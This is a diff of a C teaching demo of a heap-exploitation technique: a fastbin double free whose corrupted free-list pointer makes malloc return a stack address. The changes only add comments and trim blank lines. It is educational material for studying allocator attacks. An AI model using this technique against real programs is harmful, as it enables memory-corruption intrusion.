@@ -38,6 +38,7 @@ int main(){
     free(a);
 
     printf("Now the free list has [%p, %p, %p].\nwe'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
+    //
 
     unsigned long long *d = malloc(8);
 
@@ -49,17 +50,11 @@ int main(){
     printf("Now, we have access to %p while it remains at the head  of the free list.\nso now we are writing a fake free size (in this case, 0x20) to the stack,\nso that malloc will think there is a free chunk there and agree to\nreturn a pointer to it.\n", a);
 
     stack_var = 0x20;
-
+    //  000000000061FDF8: ...
+    //  000000000061FE00: 0x20
     printf("Now, we overwrite the first 8 bytes of the data at %p to point right after the 0x20.\n", a); 
     *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
 
     printf("3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8)); 
     printf("4rd malloc(8): %p\n", malloc(8));
-
-
-
-
-
-
-
 }
